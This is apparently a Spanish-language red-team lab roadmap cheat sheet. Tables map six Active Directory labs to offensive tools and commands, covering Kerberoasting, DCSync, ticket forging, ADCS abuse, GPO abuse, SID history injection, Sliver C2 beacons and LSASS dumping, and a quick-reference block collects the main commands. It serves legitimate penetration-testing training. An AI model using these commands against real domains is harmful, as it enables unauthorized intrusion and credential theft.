# 🛠️ Índice de Herramientas por Lab
## Red Team Ops Roadmap — Referencia rápida

> Mapeo de qué herramienta se usa en qué lab y para qué técnica específica.  
> Ordenado por lab para facilitar la preparación antes de ejecutar.  
> **Versión:** 2.0 | **Actualizado:** Junio 2026

---

## Phase-01 — Fundamentos AD

### Lab-01 — GHOST FOREST

| Fase | Técnica | Herramienta | Comando clave | Desde |
|------|---------|-------------|---------------|-------|
| 1 | Network scan | `nmap` | `nmap -sV -sC -p- IP` | Kali |
| 1 | SMB enum | `enum4linux-ng` | `enum4linux-ng -A IP` | Kali |
| 1 | LDAP enum | `ldapsearch` | `ldapsearch -H ldap://IP -x -b "DC=..."` | Kali |
| 2 | AS-REP Roasting | `impacket-GetNPUsers` | `GetNPUsers.py dominio/ -no-pass -usersfile users.txt` | Kali |
| 2 | Kerberoasting | `impacket-GetUserSPNs` | `GetUserSPNs.py dominio/user:pass -request` | Kali |
| 2 | Password cracking | `john` | `john hash.txt --wordlist=corp_wordlist.txt` | Kali |
| 3 | WinRM shell | `evil-winrm` | `evil-winrm -i IP -u user -p pass` | Kali |
| 3 | SMB validation | `nxc` (NetExec) | `nxc smb IP -u user -p pass` | Kali |
| 4 | AD enumeration | `BloodHound CE` + `SharpHound v2.5.9` | `SharpHound.exe -c All --zipfilename output.zip` | DC-01 |
| 5 | Credential hunt | `PowerShell nativo` | `reg query HKLM\SOFTWARE\...` | DC-01 |
| 6 | Lateral movement | `evil-winrm` | `evil-winrm -i IP -u user -p pass` | Kali |
| 7 | C2 | `Sliver` | `generate beacon --http IP:443` | Kali |
| 9 | Ticket forging | `impacket-ticketer` | `ticketer.py -nthash HASH -domain-sid SID -domain DOM user` | Kali |
| 10 | DCSync | `impacket-secretsdump` | `secretsdump.py dominio/user:pass@IP -just-dc-ntlm` | Kali |
| 11 | Unconstrained Delegation | `Rubeus` | `Rubeus.exe monitor /interval:5 /nowrap` | DC-01 |
| 11 | NTLM coercion | `PetitPotam` | `PetitPotam.py -u user -p pass -d dom KALI DC` | Kali |
| 11 | Constrained Delegation | `impacket-getST` | `getST.py -spn SPN -impersonate Admin dom/svc:pass` | Kali |
| 12 | GPO Abuse | `PowerShell` + SYSVOL | `ScheduledTasks.xml en SYSVOL + gpupdate /force` | Kali |
| 13 | ACL enum | `impacket-dacledit` | `dacledit dom/user:pass -action read -target obj` | Kali |
| 13 | Targeted Kerberoasting | `bloodyAD` | `bloodyad set object obj servicePrincipalName -v SPN` | Kali |

---

### Lab-02 — SILENT BRIDGE

| Fase | Técnica | Herramienta | Comando clave | Desde |
|------|---------|-------------|---------------|-------|
| 1 | Web fingerprint | `nmap` + `curl` | `nmap -sV -p 10000 IP` | Kali |
| 2 | Webmin RCE CVE-2019-12840 | `Python exploit` | `python3 webmin_rce.py -t IP -u root -p pass -c CMD` | Kali |
| 3 | Tunneling | `Ligolo-ng v0.7.5` | `proxy -selfcert + agent -connect KALI:11601` | Kali + PROD |
| 4 | Git credential disclosure | `git` | `git log -p \| grep -i password` | Post-tunnel |
| 5 | WinRM via tunnel | `evil-winrm` | `evil-winrm -i 10.0.3.7 -u thomas -p pass` | Kali |
| 6 | C2 relay | `Sliver` | Beacon via PROD como relay | Kali |
| 7 | SAM dump | `impacket-secretsdump` | `secretsdump dom/user:pass@IP -sam` | Kali |

---

### Lab-03 — DARK GATE

| Fase | Técnica | Herramienta | Comando clave | Desde |
|------|---------|-------------|---------------|-------|
| 1 | ADCS enum | `Certipy v5.0.4` | `certipy find -u user@dom -p pass -dc-ip IP -vulnerable` | Kali |
| 2 | ESC1 SAN Abuse | `Certipy` | `certipy req -u user -p pass -ca CA -template TPL -upn Admin@dom` | Kali |
| 2 | PKINIT auth | `Certipy` | `certipy auth -pfx Admin.pfx -dc-ip IP` | Kali |
| 3 | ESC4 Template Modify | `Certipy` | `certipy template -u user -p pass -template TPL -save-old` | Kali |
| 4 | ESC8 NTLM Relay (bloqueado KB5005413) | `PetitPotam` + `ntlmrelayx` | Documentado como mitigado | Kali |
| 5 | C2 | `Sliver` | `generate beacon --http IP:443 --os windows` | Kali |
| 6 | Certificate persistence | `Certipy` + PKINIT | Certificado válido post-rotación de contraseña | Kali |

---

## Phase-02 — AD Avanzado

### Lab-04 — IRON FOREST

| Fase | Técnica | Herramienta | Comando clave | Desde |
|------|---------|-------------|---------------|-------|
| 1 | BloodHound CE recon | `SharpHound v2.5.9` | `SharpHound.exe -c All` | DC-01 |
| 2 | Credential hunting | `smbclient` | `smbclient //IP/IT-Scripts -U user%pass` | Kali |
| 3 | Overpass-the-Hash | `impacket-getTGT` | `getTGT.py dominio/user:pass -dc-ip IP` | Kali |
| 4 | WriteDACL Abuse | `impacket-dacledit` | `dacledit -action write -principal user -rights FullControl dom/user:pass -dc-ip IP` | Kali |
| 5 | DCSync | `impacket-secretsdump` | `secretsdump dom/user:pass@IP -just-dc-ntlm` | Kali |
| 6 | ADIDNS WPAD | `dnstool.py` + `Responder` | `dnstool.py -u dom\\user -p pass -a add -r wpad -d KALI IP` | Kali |
| 7 | C2 | `Sliver` | `generate beacon --http IP:8443` | Kali |
| 8 | Cleanup | `dacledit` + `dnstool.py` | Restaurar DACL + tombstone WPAD | Kali |

---

### Lab-05 — SILVER CHAIN

| Fase | Técnica | Herramienta | Comando clave | Desde |
|------|---------|-------------|---------------|-------|
| 1 | BloodHound CE recon | `SharpHound v2.5.9` | `SharpHound.exe -c All` | DC-01 |
| 2 | RBCD Abuse | `impacket-addcomputer` + `getST` | `addcomputer dom/user:pass -computer-name ATK -computer-pass Pass` | Kali |
| 2 | S4U2Self/S4U2Proxy | `impacket-getST` | `getST -spn cifs/WKSTN dom/ATK$:Pass -impersonate Admin` | Kali |
| 3 | Shadow Credentials | `pywhisker` | `pywhisker -d dom -u user -p pass -t target --action add` | Kali |
| 3 | PKINIT via Shadow Creds | `certipy-ad` | `certipy auth -pfx target.pfx -dc-ip IP` | Kali |
| 4 | Silver Ticket | `impacket-ticketer` | `ticketer -nthash HASH -domain-sid SID -spn MSSQLSvc/DC:1433 dom Admin` | Kali |
| 5 | Diamond Ticket | `Rubeus` | `Rubeus.exe diamond /krbkey:AES256 /enctype:aes256 /user:Admin /domain:dom` | DC-01 |
| 6 | C2 + Cleanup | `Sliver` + `pywhisker` | Beacon + pywhisker remove + artefactos | Kali |

---

### Lab-06 — BLACK POLICY

| Fase | Técnica | Herramienta | Comando clave | Desde |
|------|---------|-------------|---------------|-------|
| 1 | Multi-forest recon | `nmap` + `ldapsearch` + `nxc` | `ldapsearch -H ldap://IP -D dom\\user -w pass -b "CN=Policies,..."` | Kali |
| 1 | Cross-forest Kerberoasting | `impacket-getTGT` + `GetUserSPNs` | `getTGT dom/user:pass -dc-ip IP && export KRB5CCNAME=user.ccache` | Kali |
| 1 | Credential hunting SMB | `smbclient` | `smbclient //IP/IT-Scripts -U dom\\user%pass` | Kali |
| 2 | SID DA translation | `.NET NTAccount` | `([NTAccount]"ATACKCORP\\Admins. del dominio").Translate([SecurityIdentifier]).Value` | DC-03 (WinRM) |
| 2 | SID History Injection | `DSInternals v4.14` | `Add-ADDBSidHistory -SamAccountName user -SidHistory 'SID' -DBPath ntds.dit -Force` | DC-03 (WinRM) |
| 2 | DCSync cross-domain | `impacket-secretsdump` | `secretsdump child.dom/child.user:pass@DC-01 -just-dc-user ATACKCORP/krbtgt` | Kali |
| 3 | ACL enum cross-forest | `impacket-dacledit` | `dacledit -action read -target obj -principal user 'corp.local/user:pass' -dc-ip IP` | Kali |
| 3 | SPN injection | `bloodyAD` | `bloodyad -d corp.local --host IP set object corp_svc servicePrincipalName -v 'fake/host'` | Kali |
| 3 | Targeted Kerberoasting | `impacket-GetUserSPNs` | `GetUserSPNs corp.local/user:pass -dc-ip IP -request -outputfile hash.txt` | Kali |
| 3 | Share credential exposure | `smbclient` | `smbclient //IP/Ext-Data -U 'ext.local\\ext.user%pass'` | Kali |
| 4 | GPO enum | `ldapsearch` | `ldapsearch -x -D dom\\user -w pass -b "CN=Policies,..." "(objectClass=groupPolicyContainer)"` | Kali |
| 4 | WriteDACL → FullControl | `impacket-dacledit` | `dacledit -action write -target-dn 'CN=GUID,...' -principal user -rights FullControl dom/user:pass` | Kali |
| 4 | GPO Abuse | `pyGPOAbuse` | `python3 pygpoabuse.py 'dom/user:pass' -gpo-id GUID -command CMD -dc-ip IP -f` | Kali |
| 4 | GPO cleanup | `pyGPOAbuse` + `dacledit` | `--cleanup + dacledit -action restore -file backup.bak` | Kali |
| 5 | Sliver C2 multi-forest | `Sliver v1.7.3` | `generate beacon --http IP:8443 --os windows --name NAME` | Kali |
| 5 | Share exfiltration | `smbclient` | `smbclient //IP/Enterprise-Strategy -U 'dom\\DA%pass'` | Kali |

---

## Herramientas pendientes — Labs 07+

| Lab | Herramienta | Técnica | Instalación |
|-----|-------------|---------|-------------|
| Lab-07 | `LAPSToolkit` | LAPS passwords | `Import-Module LAPSToolkit.ps1` |
| Lab-07 | `nanodump` | LSASS dump sin Mimikatz | `nanodump --write /tmp/lsass.dmp` |
| Lab-07 | `SharpDPAPI` | DPAPI Master Key dump | `SharpDPAPI.exe masterkeys /rpc` |
| Lab-08 | `Kerbrute` | Password spraying | `kerbrute passwordspray -d dom users.txt pass` |
| Lab-09 | `GoPhish` | Phishing campaigns | Panel web en Kali |
| Lab-10 | `Havoc C2` | C2 avanzado con BOFs | Compilar desde GitHub |
| Lab-14 | `AzureHound` | Azure AD enum | `azurehound -u user@tenant -p pass list` |
| Lab-14 | `ROADtools` | Azure AD analysis | `roadrecon gather -u user -p pass` |

---

## Referencia rápida — Comandos más usados

```bash
# Validar credenciales rápidamente
nxc smb IP -u user -p pass

# Shell WinRM
evil-winrm -i IP -u user -p pass
evil-winrm -i IP -u user -H HASH

# Enumerar AD
bloodhound-python -u user -p pass -d dominio -ns IP -c All --zip
certipy find -u user@dom -p pass -dc-ip IP -vulnerable -stdout

# DCSync
impacket-secretsdump dominio/user:pass@IP -just-dc-ntlm
impacket-secretsdump dominio/user:pass@IP -just-dc-user DOMAIN/krbtgt

# Cross-Forest Kerberoasting
impacket-getTGT dominio/user:pass -dc-ip IP
export KRB5CCNAME=user.ccache
impacket-GetUserSPNs dominio/user:pass -target-domain corp.local -dc-ip IP -request

# GPO Abuse
python3 /opt/redteam/pyGPOAbuse/pygpoabuse.py 'dom/user:pass' \
    -gpo-id 'GUID' -command 'CMD' -dc-ip IP -f

# SID History
# En DC (Evil-WinRM):
Stop-Service NTDS -Force
Import-Module C:\Temp\DSInternals\DSInternals.psd1
Add-ADDBSidHistory -SamAccountName user -SidHistory 'SID' -DBPath 'C:\Windows\NTDS\ntds.dit' -Force
Start-Service NTDS
```

---

*Red Team Ops Roadmap — Adrián Camacho | Junio 2026 — v2.0*